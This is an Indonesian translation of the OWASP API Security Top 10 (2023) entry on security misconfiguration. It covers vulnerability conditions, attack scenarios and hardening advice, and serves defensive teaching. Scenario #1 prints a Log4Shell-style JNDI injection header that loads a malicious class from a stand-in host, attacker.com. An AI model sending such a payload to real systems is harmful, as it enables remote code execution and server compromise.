# API8:2023 Kesalahan Konfigurasi Keamanan

| Agen ancaman/Vektor serangan | Kelemahan Keamanan | Impak |
| - | - | - |
| Spesifik API : Eksploitabilitas **Mudah** | Prevalensi **Menyebar Luas** : Keterdeteksian **Mudah** | Teknis **Sangat Parah** : Spesifik Bisnis |
| Penyerang akan sering mencoba mencari cacat yang tidak di-patch, titik akhir umum, layanan yang berjalan dengan konfigurasi baku tidak aman, atau berkas dan direktori yang tidak terproteksi untuk memperoleh akses tanpa otorisasi atau pengetahuan tentang sistem. Kebanyakan dari ini adalah pengetahuan publik dan eksploit mungkin tersedia. | Kesalahan konfigurasi keamanan bisa terjadi pada sebarang level dari stack API, dari level jaringan ke level aplikasi. Perkakas terotomasi tersedia untuk mendeteksi dan mengeksploitasi kesalahan konfigurasi seperti misalnya layanan yang tidak diperlukan atau opsi warisan. | Kesalahan konfigurasi keamanan tidak hanya mengekspos data pengguna yang sensitif, tapi juga rincian sistem yang dapat mengarah ke terkomprominya seluruh server. |

## Apakah API Rentan?

API mungkin rentan bila:

* Hardening keamanan yang sesuai kurang di sebarang bagian dari stack API,
  atau bila ada izin yang dikonfigurasi secara tidak tepat pada layanan cloud
* Patch keamanan terakhir kurang, atau sistem kedaluwarsa
* Fitur yang tidak diperlukan difungsikan (mis. verb HTTP, fitur pencatatan
  log)
* Ada ketidakcocokan dalam cara permintaan masuk diproses oleh server dalam
  rantai server HTTP
* Transport Layer Security (TLS) kurang
* Direktif kendali keamanan atau singgahan tidak dikirim ke klien
* Suatu kebijakan Cross-Origin Resource Sharing (CORS, Berbagi Sumber Daya
  Lintas Sumber) kurang atau ditata secara tidak tepat
* Pesan-pesan kesalahan menyertakan trace stack, atau mengekspos informasi
  sensitif lain
  
## Contoh Skenario Serangan

### Skenario #1

Sebuah server back end API memelihara suatu log akses yang ditulis oleh
utilitas pencatatan log sumber terbuka pihak ketiga yang populer, dengan
dukungan ekspansi pewakil dan pencarian JNDI (Java Naming and Directory
Interface) yang keduanya difungsikan secara baku. Untuk setiap permintaan,
satu entri baru ditulis ke berkas log dengan pola berikut:
`<metode> <versi_api>/<path> - <kode_status>`.

Seorang aktor jahat menerbitkan permintaan API berikut, yang kemudian ditulis
ke berkas log akses:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Karena konfigurasi baku yang tidak aman dari utilitas pencatatan log dan suatu
kebijakan lalu lintas jaringan arah keluar yang permisif, untuk menulis entri
yang terkait ke log akses, sambil mengekspansi nilai dalam header permintaan
`X-Api-Version`, utilitas pencatatan log akan menarik dan mengeksekusi obyek
`Malicious.class` dari server remote yang dikendalikan oleh penyerang.

### Skenario #2

Suatu situs web jejaring sosial menawarkan sebuah fitur "Pesan Langsung" yang
mengizinkan pengguna menyimpan percakapan pribadi. Untuk mengambil pesan-pesan
baru bagi percakapan tertentu, situs web menerbitkan permintaan API berikut
(interaksi pengguna tidak diperlukan):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Karena respons API tidak menyertakan header respons HTTP `Cache-Control`,
percakapan pribadi berakhir disinggahkan oleh peramban web, mengizinkan aktor
jahat untuk mengambil mereka dari berkas singgahan peramban dalam sistem
berkas.

## Bagaimana Cara Mencegah

Siklus hidup API mesti termasuk:

* Suatu proses hardening yang dapat diulang menuju ke penggelaran yang cepat
  dan mudah dari suatu lingkungan yang dikunci dengan benar
* Suatu tugas untuk meninjau dan memperbarui konfigurasi pada seluruh stack
  API. Tinjauan mesti termasuk: berkas orkestrasi, komponen API, dan layanan
  cloud (mis. izin buket S3)
* Suatu proses terotomasi untuk mengakses secara terus-menerus efektivitas
  dari konfigurasi dan pengaturan dalam semua lingkungan

Lebih jauh:

* Pastikan bahwa semua komunikasi API dari klien ke server API dan sebarang
  komponen downstream/upstream terjadi lewat kanal komunikasi yang terenkripsi
  (TLS), tanpa peduli apakah itu API internal atau melayani publik.
* Spesifiklah tentang setiap API dapat diakses oleh verb HTTP mana: semua
  verb HTTP lain mesti dinonaktifkan (mis. HEAD).
* APi yang mengharapkan diakses dari klien berbasis peramban (mis. front end
  WebApp) mesti, setidaknya:
  * mengimplementasikan suatu kebijakan Cross-Origin Resource Sharing (CORS)
    yang tepat
  * menyertakan Header Keamanan yang berlaku
* Membatasi format data/tipe konten masuk ke mereka yang memenuhi persyaratan
  fungsional/bisnis.
* Memastikan semua server dalam rantai server HTTP (mis. load balancer, proksi
  balik dan maju, dan server back end) memroses permintaan masuk dalam cara 
  yang seragam untuk menghindari masalah-masalah desync.
* Dimana berlaku, tentukan dan tegakkan semua skema payload respons API,
  termasuk respons kesalahan, untuk mencegah trace eksepsi dan informasi
  berharga lain dikirim balik ke penyerang.

## Referensi

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### Eksternal

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
